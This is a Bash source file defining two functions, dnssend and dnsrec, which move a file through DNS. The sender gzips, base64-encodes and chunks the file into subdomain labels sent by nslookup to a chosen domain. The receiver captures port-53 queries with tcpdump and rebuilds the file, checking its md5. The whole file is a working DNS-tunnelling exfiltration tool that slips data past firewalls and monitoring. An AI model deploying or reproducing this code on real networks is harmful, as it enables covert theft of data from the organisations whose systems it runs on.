function dnssend() {
    local file=$1
    local domain=$2
    local retryline=$3
    local linetotal=$(cat "$file"|gzip|base64 -w 63 |wc -l)
    local linenum=0
    local host
    local epoch=$(date +"%s")

    if [[ ! "$file" =~ . ]] || [[ ! -f "$file" ]] || [[ ! "$domain" =~ . ]]; then
        echo "Usage: ${FUNCNAME[0]} <file to send> <domain>"
        return 1
    fi

    which nslookup gzip base64 >/dev/null 2>&1 || { echo "Missing nslookup, gzip, or base64"; return 1; }

    if which md5sum awk >/dev/null; then
        md5sum=$(md5sum "$file" |awk '{print $1}')
    else
        md5sum="NONE"
    fi
    for line in $(cat "$file" |gzip|base64 -w 63); do
        let linenum++
        # epoch is to avoid caching in case you resend the file.
        if [[ ! $retryline ]] || [[ "$retryline" -eq $linenum ]]; then
            host="${line}.${epoch}.${md5sum}.${linenum}.${linetotal}.e2d.${domain}"
            echo "line $linenum / $linetotal   $host"
            nslookup $host >/dev/null 2>&1
            sleep 0.1
        fi
    done

    echo "Flushing buffer."
    for i in {1..20}; do
        host ${RANDOM}hacfhacf.e2d.${domain} >/dev/null 2>&1
        sleep 0.5
    done
    echo "done"
}


function dnsrec() {
    local file=$1
    local domain=$2
    local recfile="${file}.encoded"

    if [[ ! "$file" =~ . ]] || [[ ! "$domain" =~ . ]]; then
        echo "Usage: ${FUNCNAME[0]} <file to create> <domain>"
        return 1
    fi

    which tcpdump gzip sed base64 >/dev/null 2>&1 || { echo "Missing tcpdump, gzip, sed, or base64"; return 1; }

    if [[ -f "$recfile" ]]; then
        echo "WARNING: target recfile $recfile already exists.  Appending..."
    fi
    if [[ -f "$file" ]]; then
        echo "WARNING: target file $file already exists.  Overwriting..."
    fi

    echo "+ means receiving data."
    echo ""
    tcpdump --immediate-mode -nni any -A -s0 port 53 2>&1 \
        |egrep --line-buffered " A\? .*.e2d.${domain}" \
        |sed -u -e "s/.* A? \(.*.e2d.${domain}\).*/\1/g" \
        |while read td
            do
                if [[ ! $td =~ hacfhacf.e2d.${domain} ]]; then
                    echo "$td" >> $recfile
                    echo -n '+'
                else
                    echo ''
                    linetotal=$(tail -1 $recfile | sed -e "s/.*\.[[:digit:]]*\.\([[:digit:]]*\)\.e2d.${domain}.*/\1/g")
                    failure=0
                    for ((i = 1; i <= $linetotal; i++)); do
                        if ! grep -q "\.${i}\.${linetotal}.e2d" $recfile; then
                            failure=1
                            echo "Receive file $recfile is missing line $i"
                        fi
                    done
                    if [[ $failure == 1 ]]; then
                        echo "EXITING DUE TO FAILURE"
                        return 1
                    fi
                    cat $recfile |sort -t'.' -k4 -n |uniq \
                        |sed -e "s/\(.*\)\.[[:digit:]]*\.[[:alnum:]]*\.[[:digit:]]*\.[[:digit:]]*\.e2d.${domain}.*/\1/g" \
                        |base64 -d |gzip -d >"$file" 

                    recmd5sum=$(tail -1 $recfile | sed -e "s/.*\.\([[:alnum:]]*\)\.[[:digit:]]*\.[[:digit:]]*\.e2d.${domain}.*/\1/g")
                    md5sum=$(md5sum "$file" |awk '{print $1}')
                    if [[ $md5sum != $recmd5sum ]] && [[ $recmd5sum != 'NONE' ]]; then
                        echo "FAILURE: md5sum mismatch"
                        return 1
                    fi
                    echo "done"
                    rm -f "$recfile" >/dev/null 2>&1
                    break
                fi
            done
}

